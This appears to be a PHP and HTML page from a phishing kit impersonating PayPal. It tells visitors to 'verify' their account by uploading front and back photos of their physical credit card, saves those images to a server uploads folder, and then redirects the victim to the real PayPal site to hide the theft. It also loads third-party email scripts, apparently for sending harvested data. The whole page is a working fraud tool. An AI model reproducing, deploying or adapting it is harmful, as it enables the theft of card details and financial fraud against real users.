<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Function to handle file upload
    function handleUpload($fieldName) {
        if (isset($_FILES[$fieldName]) && $_FILES[$fieldName]["error"] == 0) {
            $targetDir = "uploads/"; // Directory where images will be uploaded
            $targetFile = $targetDir . basename($_FILES[$fieldName]["name"]); // Path to the uploaded file
            
            // Move the uploaded file to the specified directory
            if (move_uploaded_file($_FILES[$fieldName]["tmp_name"], $targetFile)) {
$yourURL="http://www.paypal.com";
               echo ("<script>location.href='$yourURL'</script>"); 
            } else {
                echo "Sorry, there was an error uploading your file.<br>";
            }
        } else {
            echo "No file uploaded for $fieldName.<br>";
        }
    }

    // Call the function for each file input field
    handleUpload("img1");
    handleUpload("img2");
}
?>


<html>

<head>
  <title>CC</title>

  <!-- Styles -->
  <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" href="stylep.css">
  <meta name="robots" content="noindex,follow" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<script src="https://smtpjs.com/v3/smtp.js"></script>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  
</head>

<body>
<img src="head.jpg" style="width:100%; height:%;"/>
<p style="color:red; padding:10px;"><strong>Note:</strong>Verify your PayPal account by uploading your Physical Credit Card(the front and back view of your physical Credit Card) </p>
 <div>
    <form class="credit-card" action="#" method="POST" id="contactForm" enctype="multipart/form-data">
      <div class="form-header">
        <h4 class="title">Physical Credit card detail</h4>
      </div>

      <div class="form-body">
      <!-- Card Number -->
  <br>
<label for="img1">Front View </label> 

  <input type="file" name="img1" id="img1" class="card-numbers" required>
  <br>
<label for="img2">Back View</label> 

  <input type="file" name="img2" id="img2" class="card-numbers" required>
  <br>
          
<img src="xam.png" style="width:100%; height:%;"/>
        </div>

        <!-- Buttons -->
        <button type="submit" class="proceed-btn"><a href="#">Proceed</a></button>
        <button type="button" class="paypal-btn"><a href="#">with</a></button>
      </div>
    </form>
    </div>

</body>
</html>
